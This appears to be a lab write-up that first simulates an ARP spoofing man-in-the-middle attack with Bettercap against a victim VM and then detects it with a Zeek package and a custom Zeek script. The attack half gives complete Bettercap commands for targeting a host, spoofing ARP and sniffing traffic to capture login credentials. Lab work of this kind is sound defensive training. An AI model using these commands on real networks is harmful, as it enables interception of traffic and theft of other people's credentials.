## Simulate ARP Spoofing from Attacker VM

###  Step 1: Start Bettercap

```bash
sudo bettercap -iface eth0
```

### Step 2: Scan the Network
Enable network probing and view discovered devices:

```bash
net.probe on
net.show
```
 Find your victim's IP.

![image](https://github.com/user-attachments/assets/81d5af34-6d09-4352-8fad-9af63f8a84ec)

victim ip 10.0.2.15

### Step 3: Launch ARP Spoof Attack
 Target the victim:

```bash
set arp.spoof.targets 10.0.2.15
```
Start ARP spoofing:

```bash
arp.spoof on
```

![image](https://github.com/user-attachments/assets/50404c75-811c-4513-93c6-f27bb70af2b9)

### Step 4: Sniff Victim’s Traffic
Enable network sniffing:

```
net.sniff on
```
On the victim system, open a browser and log into any web app (e.g., a vulnerable local site).
Captured requests will be visible in Bettercap:

![image](https://github.com/user-attachments/assets/d1fd7330-d4ba-47e0-a155-f64e19d7c771)

![image](https://github.com/user-attachments/assets/e50dadd4-19d1-4b9b-97bf-1446d96440af)

Bettercap displaying credentials:

![image](https://github.com/user-attachments/assets/fc0be8dd-59fb-43fd-910f-cac74b4c2311)

arp spoofing attcked worked

### Detect ARP Spoofing using Zeek

## 📦 Installing an ARP Detection Package in Zeek

This section shows how to install and enable an ARP detection package (e.g., **zeek-arp**) using the Zeek Package Manager (`zkg`).

---

### 🔹 Step 1: Verify `zkg` is Installed

```bash
zkg version
```
If the command reports “not found”, install it:

```bash
pip install zkg
```

 Step 2: Install the ARP Package

Install the popular ARP detection package from GitHub:

```bash
zkg install zeek/zeek-arp
```
If the above fails, use the full URL:

```bash
zkg install https://github.com/J-Gras/zeek-arp
This downloads the package into your Zeek plugins folder.
```

Step 3: Enable the Package in Your Zeek Policy
Open your local Zeek configuration file — typically:

```bash
nano /opt/zeek/share/zeek/site/local.zeek
```
Add this line to load the ARP package:

```zeek
@load packages/zeek-arp
```
![image](https://github.com/user-attachments/assets/f8f4ae9c-44dc-4223-b78f-a2c1653157c6)


Save and close the file.
 Step 4: Deploy/Restart Zeek
Apply your updated configuration:

```
bash
cd /opt/zeek/bin
sudo ./zeekctl deploy
```

This restarts Zeek and loads the new ARP detection logic.

Now we need a script for detecting ARP spoofing.

we cretaing a new script.

```bash
nano /opt/zeek/share/zeek/site/arp-spoof-detect.zeek 
```

paste the scrript there to dectect arp spoofing.


```zeek
export {
    redef enum Notice::Type += {
        ARP_Spoofing
    };
}

global seen_arp: table[addr] of set[string];

event arp_reply(mac_src: string, mac_dst: string, spa: addr, sha: string, tpa: addr, tha: string)
{
    if (spa !in seen_arp)
        seen_arp[spa] = set();

    if (sha !in seen_arp[spa])
    {
        if (|seen_arp[spa]| > 0)
        {
            print fmt(" ARP Spoofing Detected! IP %s now has MAC %s (previous: %s)", spa, sha, seen_arp[spa]);
            NOTICE([
                $note=ARP_Spoofing,
                $msg=fmt("ARP spoofing detected: %s is now %s", spa, sha),
                $sub=fmt("Old MACs: %s", seen_arp[spa])
            ]);
        }
        add seen_arp[spa][sha];
    }
}
```

Open your local Zeek configuration file — typically:

```bash
nano /opt/zeek/share/zeek/site/local.zeek
```
Add this line to load the ARP package:

```zeek
@load ./arp-spoof-detect
```

![image](https://github.com/user-attachments/assets/88553d18-5e2c-4967-a850-ce817626c8ab)

 Deploy/Restart Zeek
Apply your updated configuration:

```
bash
cd /opt/zeek/bin
sudo ./zeekctl deploy
```

This restarts Zeek and loads the new ARP detection logic Scrpit .

now after some time we will able to see notice.log file in current .
enter as root user  `sudo su`

```
cd /opt/zeek/logs/current
```

![image](https://github.com/user-attachments/assets/f5388667-b0db-43dd-8e29-c94027227c35)


Tail the file to monitor live, then perform the attack.We can see that arp spoofing as dectected.

```
tail -f notice.log
```

![image](https://github.com/user-attachments/assets/e910a6cd-2dcc-42ce-a973-59a964dfbd89)

